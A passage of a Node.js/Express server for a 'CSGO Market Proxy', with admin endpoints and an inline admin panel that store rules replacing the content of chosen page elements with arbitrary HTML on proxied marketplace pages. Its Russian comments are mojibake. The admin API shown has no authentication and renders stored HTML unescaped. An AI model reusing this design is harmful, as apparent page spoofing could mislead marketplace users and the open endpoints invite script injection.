    // –û–ø—Ç–∏–º–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –∫—ç—à–∏—Ä—É—é—â–∏–µ –∑–∞–≥–æ–ª–æ–≤–∫–∏ - –æ—Ç–∫–ª—é—á–∞–µ–º –∫–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è –±–æ–ª–µ–µ —á–∞—Å—Ç—ã—Ö –ø—Ä–æ–≤–µ—Ä–æ–∫
    res.set('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.set('Pragma', 'no-cache');
    res.set('Expires', '0');
    
    res.json({ 
        hasCustomizations,
        matchedUrl: matchedUrl,
        timestamp: Date.now()
    });
});

// –£–õ–£–ß–®–ï–ù–û: –ê–¥–º–∏–Ω API –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–∞—Å—Ç—Ä–æ–µ–∫ –∫–∞—Å—Ç–æ–º–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã —Å –±–æ–ª–µ–µ –Ω–∞–¥–µ–∂–Ω—ã–º –ø–æ–∏—Å–∫–æ–º
app.get('/admin-api/get-custom-page', (req, res) => {
    const urlToCheck = req.query.url;
    
    if (!urlToCheck) {
        return res.status(400).json({ error: 'URL parameter is required' });
    }
    
    // –î–µ–∫–æ–¥–∏—Ä—É–µ–º URL –¥–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–≥–æ —Å—Ä–∞–≤–Ω–µ–Ω–∏—è
    const decodedUrl = decodeURIComponent(urlToCheck);
    
    // –ü–æ–∏—Å–∫ –ø–æ–¥—Ö–æ–¥—è—â–µ–π –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ —Å —É—á–µ—Ç–æ–º —à–∞–±–ª–æ–Ω–æ–≤
    let customization = null;
    let matchedUrl = null;
    
    for (const [pageUrl, config] of customPages.entries()) {
        // –¢–æ—á–Ω–æ–µ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ
        if (pageUrl === decodedUrl || pageUrl === urlToCheck) {
            customization = config;
            matchedUrl = pageUrl;
            break;
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ —à–∞–±–ª–æ–Ω —Å–æ –∑–≤–µ–∑–¥–æ—á–∫–æ–π
        if (pageUrl.includes('*')) {
            const escapeRegExp = (string) => string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            const pattern = escapeRegExp(pageUrl).replace(/\\\*/g, '.*');
            const regex = new RegExp('^' + pattern + '$');
            
            if (regex.test(decodedUrl) || regex.test(urlToCheck)) {
                customization = config;
                matchedUrl = pageUrl;
                break;
            }
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ ID —Ç–æ–≤–∞—Ä–∞
        if (decodedUrl.includes('id=') && pageUrl.includes('id=')) {
            const urlIdMatch = /id=([0-9]+)/.exec(decodedUrl);
            const pageUrlIdMatch = /id=([0-9]+)/.exec(pageUrl);
            
            if (urlIdMatch && pageUrlIdMatch && urlIdMatch[1] === pageUrlIdMatch[1]) {
                customization = config;
                matchedUrl = pageUrl;
                break;
            }
        }
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ –ø—É—Ç–∏ –±–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
        const urlPath = decodedUrl.split('?')[0];
        const pageUrlPath = pageUrl.split('?')[0];
        
        if (urlPath === pageUrlPath) {
            customization = config;
            matchedUrl = pageUrl;
            break;
        }
    }
    
    if (!customization) {
        return res.status(404).json({ 
            error: 'Custom page configuration not found',
            checkedUrl: decodedUrl
        });
    }
    
    // –û—Ç–∫–ª—é—á–∞–µ–º –∫–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è –±–æ–ª–µ–µ –Ω–∞–¥–µ–∂–Ω–æ–≥–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è
    res.set('Cache-Control', 'no-cache, no-store, must-revalidate');
    res.set('Pragma', 'no-cache');
    res.set('Expires', '0');
    
    res.json({
        ...customization,
        matchedUrl: matchedUrl,
        requestedUrl: decodedUrl
    });
});

// –ù–û–í–û–ï: –î–æ–±–∞–≤–∏–º API –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π
app.get('/admin-api/debug-modifications', (req, res) => {
    try {
        // –°–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤—Å–µ—Ö –∞–∫—Ç–∏–≤–Ω—ã—Ö –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—è—Ö
        const debugInfo = {
            activeModifications: Array.from(customPages.entries()).map(([url, config]) => ({
                url,
                selector: config.selector,
                value: config.value,
                lastModified: config.timestamp,
                formattedTimestamp: new Date(config.timestamp).toLocaleString()
            })),
            serverInfo: {
                time: new Date().toISOString(),
                uptime: process.uptime(),
                nodeVersion: process.version,
                memory: process.memoryUsage()
            }
        };
        
        res.json(debugInfo);
    } catch (error) {
        console.error('Error in debug endpoint:', error);
        res.status(500).json({ error: 'Internal server error during debug', message: error.message });
    }
});

// –£–õ–£–ß–®–ï–ù–û: –ê–¥–º–∏–Ω API –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –Ω–∞—Å—Ç—Ä–æ–µ–∫ —Å –ª—É—á—à–µ–π –æ–±—Ä–∞–±–æ—Ç–∫–æ–π URL
app.post('/admin-api/save-custom-page', express.json(), (req, res) => {
    const { url, selector, value } = req.body;
    
    if (!url || !selector || value === undefined) {
        return res.status(400).json({ error: 'URL, selector, and value are required' });
    }
    
    // –ù–æ—Ä–º–∞–ª–∏–∑—É–µ–º URL –¥–ª—è –±–æ–ª–µ–µ –Ω–∞–¥–µ–∂–Ω–æ–≥–æ —Å–æ–ø–æ—Å—Ç–∞–≤–ª–µ–Ω–∏—è
    const normalizedUrl = url.trim();
    
    // –í–∞–ª–∏–¥–∏—Ä—É–µ–º —Å–µ–ª–µ–∫—Ç–æ—Ä
    try {
        // –ü—Ä–æ—Å—Ç–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å–∞ —Å–µ–ª–µ–∫—Ç–æ—Ä–∞
        if (selector.includes('<') && selector.includes('>')) {
            throw new Error('Selector contains HTML tags');
        }
    } catch (e) {
        return res.status(400).json({ error: 'Invalid CSS selector: ' + e.message });
    }
    
    console.log(`Saving custom page modification for URL: ${normalizedUrl}`);
    
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
    customPages.set(normalizedUrl, {
        selector,
        value,
        timestamp: Date.now()
    });
    
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ —Ñ–∞–π–ª
    saveCustomPages();
    
    // –û—á–∏—â–∞–µ–º –≤—Å–µ —Å–≤—è–∑–∞–Ω–Ω—ã–µ —Å —ç—Ç–∏–º URL –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –±—ã—Ç—å –¥—É–±–ª–∏–∫–∞—Ç–∞–º–∏
    // –¥–ª—è —Ä–∞–∑–Ω—ã—Ö –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤ URL –æ–¥–Ω–æ–π –∏ —Ç–æ–π –∂–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    for (const [pageUrl, config] of customPages.entries()) {
        // –ü—Ä–æ–ø—É—Å–∫–∞–µ–º —Ç–µ–∫—É—â–∏–π URL
        if (pageUrl === normalizedUrl) continue;
        
        // –ü—Ä–æ–≤–µ—Ä–∫–∞, –æ—Ç–Ω–æ—Å–∏—Ç—Å—è –ª–∏ URL –∫ —Ç–æ–π –∂–µ —Å—Ç—Ä–∞–Ω–∏—Ü–µ
        const urlPath = normalizedUrl.split('?')[0];
        const pageUrlPath = pageUrl.split('?')[0];
        
        // –ï—Å–ª–∏ –±–∞–∑–æ–≤—ã–π –ø—É—Ç—å —Å–æ–≤–ø–∞–¥–∞–µ—Ç –∏ —ç—Ç–æ –Ω–µ —à–∞–±–ª–æ–Ω, —É–¥–∞–ª—è–µ–º –¥—É–±–ª–∏—Ä—É—é—â–∏–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
        if (urlPath === pageUrlPath && !pageUrl.includes('*')) {
            console.log(`Removing duplicate URL: ${pageUrl}`);
            customPages.delete(pageUrl);
        }
        
        // –ï—Å–ª–∏ —É–∫–∞–∑–∞–Ω—ã –æ–¥–∏–Ω–∞–∫–æ–≤—ã–µ ID —Ç–æ–≤–∞—Ä–∞
        if (normalizedUrl.includes('id=') && pageUrl.includes('id=')) {
            const urlIdMatch = /id=([0-9]+)/.exec(normalizedUrl);
            const pageUrlIdMatch = /id=([0-9]+)/.exec(pageUrl);
            
            if (urlIdMatch && pageUrlIdMatch && urlIdMatch[1] === pageUrlIdMatch[1] && pageUrl !== normalizedUrl) {
                console.log(`Removing duplicate URL with same ID: ${pageUrl}`);
                customPages.delete(pageUrl);
            }
        }
    }
    
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –ø–æ—Å–ª–µ —É–¥–∞–ª–µ–Ω–∏—è –¥—É–±–ª–∏–∫–∞—Ç–æ–≤
    saveCustomPages();
    
    res.json({ 
        success: true, 
        message: 'Custom page configuration saved',
        timestamp: Date.now()
    });
});

// –ù–û–í–û–ï: –ê–¥–º–∏–Ω API –¥–ª—è –≤–∞–ª–∏–¥–∞—Ü–∏–∏ —Å–µ–ª–µ–∫—Ç–æ—Ä–∞
app.post('/admin-api/validate-selector', express.json(), (req, res) => {
    const { selector } = req.body;
    
    if (!selector) {
        return res.status(400).json({ error: 'Selector is required' });
    }
    
    try {
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º —Å–µ–ª–µ–∫—Ç–æ—Ä –Ω–∞ —Å–∏–Ω—Ç–∞–∫—Å–∏—á–µ—Å–∫—É—é –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å
        // –î–ª—è —ç—Ç–æ–≥–æ –∏—Å–ø–æ–ª—å–∑—É–µ–º –ø—Ä–æ—Å—Ç—É—é —ç–≤—Ä–∏—Å—Ç–∏–∫—É
        const valid = !(/[<>]/.test(selector) && !/<[^>]*>/.test(selector));
        
        res.json({ 
            valid,
            message: valid ? 'Selector appears to be valid' : 'Selector contains invalid characters'
        });
    } catch (e) {
        res.status(400).json({ 
            valid: false,
            error: e.message 
        });
    }
});

// –ù–û–í–û–ï: –ê–¥–º–∏–Ω API –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–∏–º–µ–Ω–µ–Ω–∏—è –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–π
app.get('/admin-api/check-modifications-status', (req, res) => {
    res.json({
        active: customPages.size,
        lastUpdated: Math.max(...Array.from(customPages.values()).map(page => page.timestamp || 0), 0),
        serverTime: Date.now()
    });
});

// –ê–¥–º–∏–Ω API –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –Ω–∞—Å—Ç—Ä–æ–µ–∫ –∫–∞—Å—Ç–æ–º–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã
app.post('/admin-api/delete-custom-page', express.json(), (req, res) => {
    const { url } = req.body;
    
    if (!url) {
        return res.status(400).json({ error: 'URL parameter is required' });
    }
    
    // –£–¥–∞–ª—è–µ–º –Ω–∞—Å—Ç—Ä–æ–π–∫–∏
    const deleted = customPages.delete(url);
    
    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è
    saveCustomPages();
    
    if (deleted) {
        res.json({ success: true, message: 'Custom page configuration deleted' });
    } else {
        res.status(404).json({ error: 'Custom page configuration not found' });
    }
});

// –ê–¥–º–∏–Ω API –¥–ª—è —Å–±—Ä–æ—Å–∞ –≤—Å–µ—Ö –Ω–∞—Å—Ç—Ä–æ–µ–∫ –∫–∞—Å—Ç–æ–º–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü
app.post('/admin-api/reset-all-custom-pages', express.json(), (req, res) => {
    try {
        // –û—á–∏—â–∞–µ–º –≤—Å–µ –∫–∞—Å—Ç–æ–º–Ω—ã–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        customPages.clear();
        
        // –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è
        saveCustomPages();
        
        res.json({ success: true, message: 'All custom page configurations have been reset' });
    } catch (error) {
        console.error('Error resetting custom pages:', error);
        res.status(500).json({ error: 'Internal server error while resetting custom pages' });
    }
});

// –ê–¥–º–∏–Ω API –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ –≤—Å–µ—Ö –∫–∞—Å—Ç–æ–º–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü
app.get('/admin-api/list-custom-pages', (req, res) => {
    const list = Array.from(customPages.entries()).map(([url, config]) => ({
        url,
        selector: config.selector,
        value: config.value,
        timestamp: config.timestamp
    }));
    
    res.json(list);
});

// –î–æ–±–∞–≤–ª—è–µ–º API –¥–ª—è –æ—á–∏—Å—Ç–∫–∏ –∫–µ—à–∞
app.post('/admin-api/clear-cache', (req, res) => {
    try {
        // –û—á–∏—â–∞–µ–º –∫–µ—à –≤ –±—Ä–∞—É–∑–µ—Ä–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å –ø–æ–º–æ—â—å—é —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã—Ö –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤
        res.set('Clear-Site-Data', '"cache", "cookies", "storage"');
        res.set('Cache-Control', 'no-cache, no-store, must-revalidate');
        res.set('Pragma', 'no-cache');
        res.set('Expires', '0');
        
        // –í–æ–∑–≤—Ä–∞—â–∞–µ–º —É—Å–ø–µ—à–Ω—ã–π –æ—Ç–≤–µ—Ç
        res.json({ success: true, message: '–ö–µ—à —É—Å–ø–µ—à–Ω–æ –æ—á–∏—â–µ–Ω' });
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—á–∏—Å—Ç–∫–µ –∫–µ—à–∞:', error);
        res.status(500).json({ success: false, error: '–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞ –ø—Ä–∏ –æ—á–∏—Å—Ç–∫–µ –∫–µ—à–∞' });
    }
});

// –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å —Å —É–ª—É—á—à–µ–Ω–Ω—ã–º –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–æ–º
app.get('/adminka', (req, res) => {
    // HTML –¥–ª—è –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª–∏
    const html = `
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å CSGO Market Proxy</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body {
                padding: 20px;
                background-color: #f8f9fa;
            }
            .card {
                margin-bottom: 20px;
                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            }
            .form-control {
                margin-bottom: 15px;
            }
            .list-group-item {
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            .badge {
                font-size: 0.8em;
            }
            .value-preview {
                max-width: 150px;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }
            .actions {
                display: flex;
                gap: 5px;
            }
            .modified-time {
                font-size: 0.8em;
                color: #6c757d;
            }
            .url-preview {
                max-width: 250px;
                overflow: hidden;
                text-overflow: ellipsis;
                white-space: nowrap;
            }
            .toast-container {
                position: fixed;
                top: 20px;
                right: 20px;
                z-index: 1000;
            }
            .preview-content {
                background-color: white;
                border: 1px solid #ddd;
                padding: 10px;
                border-radius: 4px;
                margin-top: 5px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1 class="mb-4">–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å CSGO Market Proxy</h1>
            
            <div class="row">
                <div class="col-md-6">
                    <div class="card">
                        <div class="card-header bg-primary text-white">
                            <h5 class="card-title mb-0">–î–æ–±–∞–≤–∏—Ç—å/–ò–∑–º–µ–Ω–∏—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã</h5>
                        </div>
                        <div class="card-body">
                            <form id="customPageForm">
                                <div class="mb-3">
                                    <label for="pageUrl" class="form-label">URL —Å—Ç—Ä–∞–Ω–∏—Ü—ã</label>
                                    <input type="text" class="form-control" id="pageUrl" placeholder="https://market-csgo.co/ru/Rifle/AK-47/..." required>
                                    <div class="form-text">–ü–æ–ª–Ω—ã–π URL —Å—Ç—Ä–∞–Ω–∏—Ü—ã, –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞—Ç—å. –ú–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å '*' –∫–∞–∫ –ø–æ–¥—Å—Ç–∞–Ω–æ–≤–æ—á–Ω—ã–π –∑–Ω–∞–∫.</div>
                                </div>
                                
                                <div class="mb-3">
                                    <label for="cssSelector" class="form-label">CSS —Å–µ–ª–µ–∫—Ç–æ—Ä</label>
                                    <input type="text" class="form-control" id="cssSelector" placeholder="#app > app-main-site > div > ..." required>
                                    <div class="form-text">CSS —Å–µ–ª–µ–∫—Ç–æ—Ä —ç–ª–µ–º–µ–Ω—Ç–∞, –∑–Ω–∞—á–µ–Ω–∏–µ –∫–æ—Ç–æ—Ä–æ–≥–æ –Ω—É–∂–Ω–æ –∏–∑–º–µ–Ω–∏—Ç—å</div>
                                </div>
                                
                                <div class="mb-3">
                                    <label for="customValue" class="form-label">–ù–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ</label>
                                    <textarea class="form-control" id="customValue" rows="3" placeholder="–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ..." required></textarea>
                                    <div class="form-text">HTML-–∫–æ–¥ –∏–ª–∏ —Ç–µ–∫—Å—Ç, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –æ—Ç–æ–±—Ä–∞–∂–∞—Ç—å—Å—è –≤ –≤—ã–±—Ä–∞–Ω–Ω–æ–º —ç–ª–µ–º–µ–Ω—Ç–µ</div>
                                </div>
                                
                                <button type="submit" class="btn btn-primary">–°–æ—Ö—Ä–∞–Ω–∏—Ç—å</button>
                                <button type="button" id="testButton" class="btn btn-outline-secondary ms-2">–ü—Ä–æ–≤–µ—Ä–∏—Ç—å —Å–µ–ª–µ–∫—Ç–æ—Ä</button>
                                <button type="button" id="refreshCacheBtn" class="btn btn-outline-info ms-2">–°–±—Ä–æ—Å–∏—Ç—å –∫–µ—à</button>
                            </form>
                        </div>
                    </div>
                </div>
                
                <div class="col-md-6">
                    <div class="card">
                        <div class="card-header bg-info text-white d-flex justify-content-between align-items-center">
                            <h5 class="card-title mb-0">–°–ø–∏—Å–æ–∫ –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü</h5>
                            <button type="button" id="resetAllBtn" class="btn btn-sm btn-outline-light">–°–±—Ä–æ—Å–∏—Ç—å –≤—Å–µ</button>
                        </div>
                        <div class="card-body">
                            <div class="list-group" id="customPagesList">
                                <div class="text-center py-4 text-muted">
                                    <div class="spinner-border spinner-border-sm" role="status">
                                        <span class="visually-hidden">–ó–∞–≥—Ä—É–∑–∫–∞...</span>
                                    </div>
                                    –ó–∞–≥—Ä—É–∑–∫–∞ —Å–ø–∏—Å–∫–∞...
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Modal –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —É–¥–∞–ª–µ–Ω–∏—è -->
        <div class="modal fade" id="deleteModal" tabindex="-1">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-danger text-white">
                        <h5 class="modal-title">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —É–¥–∞–ª–µ–Ω–∏—è</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <p>–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ —É–¥–∞–ª–∏—Ç—å –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –¥–ª—è —Å—Ç—Ä–∞–Ω–∏—Ü—ã?</p>
                        <p id="deleteModalUrl" class="text-break small"></p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">–û—Ç–º–µ–Ω–∞</button>
                        <button type="button" class="btn btn-danger" id="confirmDelete">–£–¥–∞–ª–∏—Ç—å</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Modal –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –¥–µ—Ç–∞–ª–µ–π -->
        <div class="modal fade" id="detailsModal" tabindex="-1">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header bg-primary text-white">
                        <h5 class="modal-title">–î–µ—Ç–∞–ª–∏ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <div class="mb-3">
                            <label class="form-label fw-bold">URL:</label>
                            <div id="detailUrl" class="text-break"></div>
                        </div>
                        <div class="mb-3">
                            <label class="form-label fw-bold">CSS —Å–µ–ª–µ–∫—Ç–æ—Ä:</label>
                            <div id="detailSelector" class="text-break"></div>
                        </div>
                        <div class="mb-3">
                            <label class="form-label fw-bold">–ó–Ω–∞—á–µ–Ω–∏–µ:</label>
                            <div id="detailValue" class="border p-2 bg-light"></div>
                        </div>
                        <div class="mb-3">
                            <label class="form-label fw-bold">–î–∞—Ç–∞ –∏–∑–º–µ–Ω–µ–Ω–∏—è:</label>
                            <div id="detailTimestamp"></div>
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">–ó–∞–∫—Ä—ã—Ç—å</button>
                        <a href="#" class="btn btn-primary" id="viewPageBtn" target="_blank">–û—Ç–∫—Ä—ã—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É</a>
                        <button type="button" class="btn btn-warning" id="editItemBtn">–†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Modal –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —Å–±—Ä–æ—Å–∞ –≤—Å–µ—Ö –Ω–∞—Å—Ç—Ä–æ–µ–∫ -->
        <div class="modal fade" id="resetAllModal" tabindex="-1">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header bg-danger text-white">
                        <h5 class="modal-title">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Å–±—Ä–æ—Å–∞</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <p><strong>–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ —Å–±—Ä–æ—Å–∏—Ç—å –í–°–ï –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏?</strong></p>
                        <p>–≠—Ç–æ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–µ–ª—å–∑—è –æ—Ç–º–µ–Ω–∏—Ç—å. –í—Å–µ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏ –±—É–¥—É—Ç —É–¥–∞–ª–µ–Ω—ã.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">–û—Ç–º–µ–Ω–∞</button>
                        <button type="button" class="btn btn-danger" id="confirmResetAll">–°–±—Ä–æ—Å–∏—Ç—å –≤—Å–µ</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- –°–∏—Å—Ç–µ–º–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π -->
        <div class="toast-container"></div>
        
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
        <script>
            // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
            let deleteUrl = '';
            let customPagesList = [];
            
            // DOM —ç–ª–µ–º–µ–Ω—Ç—ã
            const form = document.getElementById('customPageForm');
            const pageUrlInput = document.getElementById('pageUrl');
            const cssSelectorInput = document.getElementById('cssSelector');
            const customValueInput = document.getElementById('customValue');
            const customPagesListEl = document.getElementById('customPagesList');
            const deleteModal = new bootstrap.Modal(document.getElementById('deleteModal'));
            const detailsModal = new bootstrap.Modal(document.getElementById('detailsModal'));
            const resetAllModal = new bootstrap.Modal(document.getElementById('resetAllModal'));
            const confirmDeleteBtn = document.getElementById('confirmDelete');
            const confirmResetAllBtn = document.getElementById('confirmResetAll');
            const resetAllBtn = document.getElementById('resetAllBtn');
            const testButton = document.getElementById('testButton');
            
            // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∫–∞–∑–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
            function showToast(message, type = 'success') {
                const toastContainer = document.querySelector('.toast-container');
                
                const toastEl = document.createElement('div');
                toastEl.className = `toast align-items-center text-white bg-${type}`;
                toastEl.setAttribute('role', 'alert');
                toastEl.setAttribute('aria-live', 'assertive');
                toastEl.setAttribute('aria-atomic', 'true');
                
                toastEl.innerHTML = `
                    <div class="d-flex">
                        <div class="toast-body">
                            ${message}
                        </div>
                        <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
                    </div>
                `;
                
                toastContainer.appendChild(toastEl);
                
                const toast = new bootstrap.Toast(toastEl, {
                    autohide: true,
                    delay: 3000
                });
                
                toast.show();
                
                // –£–¥–∞–ª—è–µ–º —ç–ª–µ–º–µ–Ω—Ç –ø–æ—Å–ª–µ —Å–∫—Ä—ã—Ç–∏—è
                toastEl.addEventListener('hidden.bs.toast', () => {
                    toastEl.remove();
                });
            }
            
            // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞—Ç—ã
            function formatDate(timestamp) {
                if (!timestamp) return '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
                
                const date = new Date(timestamp);
                return date.toLocaleString('ru-RU', {
                    year: 'numeric',
                    month: 'numeric',
                    day: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });
            }
            
            // –ó–∞–≥—Ä—É–∑–∫–∞ —Å–ø–∏—Å–∫–∞ –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü
            async function loadCustomPages() {
                try {
                    const response = await fetch('/admin-api/list-custom-pages');
                    if (!response.ok) throw new Error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å–ø–∏—Å–∫–∞');
                    
                    customPagesList = await response.json();
                    renderCustomPagesList();
                } catch (error) {
                    console.error('–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏:', error);
                    customPagesListEl.innerHTML = `
                        <div class="alert alert-danger">
                            –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å–ø–∏—Å–∫–∞: ${error.message}
                        </div>
                    `;
                }
            }
            
            // –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü
            function renderCustomPagesList() {
                if (customPagesList.length === 0) {
                    customPagesListEl.innerHTML = `
                        <div class="text-center py-4 text-muted">
                            <i class="bi bi-info-circle"></i>
                            –ù–µ—Ç –º–æ–¥–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü
                        </div>
                    `;
                    return;
                }
                
                customPagesListEl.innerHTML = '';
                
                // –°–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ –¥–∞—Ç–µ –∏–∑–º–µ–Ω–µ–Ω–∏—è (—Å–Ω–∞—á–∞–ª–∞ –Ω–æ–≤—ã–µ)
                customPagesList.sort((a, b) => b.timestamp - a.timestamp);
                
                customPagesList.forEach(item => {
                    const listItem = document.createElement('div');
                    listItem.className = 'list-group-item';
                    
                    listItem.innerHTML = `
                        <div class="ms-2 me-auto">
